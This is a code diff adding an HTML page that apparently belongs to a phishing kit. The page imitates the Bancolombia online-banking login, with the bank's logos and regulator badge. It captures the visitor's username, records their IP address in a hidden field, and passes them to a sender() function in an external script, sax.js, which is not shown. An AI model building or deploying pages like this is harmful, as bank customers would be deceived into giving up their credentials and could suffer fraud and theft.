@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+	 
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual Personas</title>
+<link rel="stylesheet" href="style.css">
+<script src="js/jquery-3.7.7.js"></script>
+</head>
+<body>
+
+<!-- HEADER SUPERIOR -->
+<div class="header-top">
+    <div class="header-content">
+        <img src="images/logo.svg" alt="Bancolombia" class="logo-header">
+    </div>
+</div>
+
+<h1 class="titulo-principal">Te damos la bienvenida</h1>
+
+<div class="form-container">
+    <div class="form-box">
+        <p class="descripcion">
+            El usuario es el mismo con el que ingresas a la <br>
+            <strong>Sucursal Virtual Personas.</strong>
+        </p>
+
+        <!-- CAMPO USUARIO CON ICONO Y TEXTO DENTRO DE LA LÍNEA -->
+        <div class="campo-usuario">
+             <img src="icons/icon-user.png" class="icono">
+             <input type="text" id="usuario" class="input-user" placeholder=" " />
+             <span class="placeholder-usuario">Usuario</span>
+        </div>
+
+        <p class="olv"><a href="#">¿Olvidaste tu usuario?</a></p>
+
+        <div class="botones">
+            <!-- Volver a index0.html (donde están las 3 opciones) -->
+            <button class="btn-volver" onclick="window.location.href='index0.html'">Volver</button>
+            <!-- Validar antes de enviar -->
+            <button class="btn-continuar" onclick="validar()">Continuar</button>
+        </div>
+    </div>
+    <!-- IMAGEN DE LINEAS COMO PARTE INFERIOR DEL CARD (ELIMINADA) -->
+
+</div>
+
+<!-- FOOTER -->
+<div class="footer-container">
+    <div class="logo-intermedio">
+        <img src="images/loo.png" alt="Bancolombia">
+    </div>
+    
+    <div class="vigilado-logo">
+        <img src="images/vigiladosuper.png">
+    </div>
+
+    <div class="info-footer">
+        <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
+        <div id="fecha-hora" class="fecha-text"></div>
+    </div>
+</div>
+
+<!-- CAMPOS NECESARIOS PARA SAX -->
+<div id="address" style="display:none;"></div>
+
+<script>
+    // Script para IP
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $("#gfg").html(data.ip);
+        $("#address").html(data.ip);
+    });
+
+    // Script para Fecha y Hora
+    function actualizarFecha() {
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
+        const fecha = new Date().toLocaleDateString('es-CO', options);
+        document.getElementById("fecha-hora").textContent = fecha;
+    }
+    setInterval(actualizarFecha, 1000);
+    actualizarFecha();
+</script>
+
+<script src="js/sax.js"></script>
+
+<script>
+    // VALIDACIÓN ALFANUMÉRICA
+    const usuarioInput = document.getElementById("usuario");
+    
+    // 1. Restringir entrada: Solo letras y números (sin espacios ni símbolos)
+    usuarioInput.addEventListener("input", function() {
+        this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+    });
+
+    // 2. Validar al enviar: Debe tener letras Y números
+    function validar() {
+        const val = usuarioInput.value;
+        const hasLetters = /[a-zA-Z]/.test(val);
+        const hasNumbers = /[0-9]/.test(val);
+        
+        if (hasLetters && hasNumbers) {
+            sender(); 
+        } else {
+            alert("El usuario debe ser alfanumérico (debe contener letras y números).");
+        }
+    }
+</script>
+
+</body>
+</html>
